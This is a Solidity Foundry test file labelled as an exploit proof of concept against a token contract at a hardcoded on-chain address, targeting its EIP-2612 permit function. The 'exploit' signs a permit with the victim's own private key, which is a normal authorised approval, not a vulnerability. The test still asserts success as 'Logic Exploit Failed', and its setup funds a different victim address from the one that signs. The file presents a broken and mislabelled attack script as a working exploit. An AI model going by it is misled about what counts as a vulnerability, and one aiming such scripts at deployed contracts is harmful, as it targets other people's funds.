// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ISapToken {
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
    function allowance(address owner, address spender) external view returns (uint256);
    function nonces(address owner) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x039639Ed22A7654f74C1B0017C9d0DF85C26B63B;
    address attacker = address(this);
    address internal victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create a victim account
        victim = address(0x1234567890123456789012345678901234567890);
        // Label addresses for clarity
        vm.label(victim, "Victim");
        vm.label(TARGET, "SapToken");

        // Give victim some tokens so they can have allowance (optional)
        deal(address(TARGET), victim, 1000 * 10**9); // 9 decimals
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Create a victim with known private key (for signing)
        uint256 victimPrivateKey = 0x1234567890123456789012345678901234567890123456789012345678901234;
        address victimAddress = vm.addr(victimPrivateKey);

        // Step 2: Prepare permit parameters
        uint256 amount = 1000 * 10**9; // 9 decimals
        uint256 deadline = block.timestamp + 1 days;

        // Step 3: Get current nonce for victim
        ISapToken token = ISapToken(TARGET);
        uint256 nonce = token.nonces(victimAddress);

        // Step 4: Compute permit hash
        bytes32 PERMIT_TYPEHASH = 0x6e71EDAe12b1b97f4d1f60370feF10105Fa2Faae0126114a169c64845d6126c9;
        bytes32 hashStruct = keccak256(abi.encode(
            PERMIT_TYPEHASH,
            victimAddress,
            attacker,
            amount,
            nonce,
            deadline
        ));

        // Get DOMAIN_SEPARATOR
        bytes32 DOMAIN_SEPARATOR = token.DOMAIN_SEPARATOR();

        // Compute the final hash
        bytes32 hash = keccak256(abi.encodePacked(uint16(0x1901), DOMAIN_SEPARATOR, hashStruct));

        // Step 5: Sign the hash
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimPrivateKey, hash);

        // Step 6: Call permit with the signature
        token.permit(victimAddress, attacker, amount, deadline, v, r, s);

        // Step 7: Verify allowance > 0
        uint256 allowance = token.allowance(victimAddress, attacker);
        require(allowance > 0, "Allowance should be greater than 0");
        assertGt(token.allowance(victimAddress, attacker), 0, "Logic Exploit Failed");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
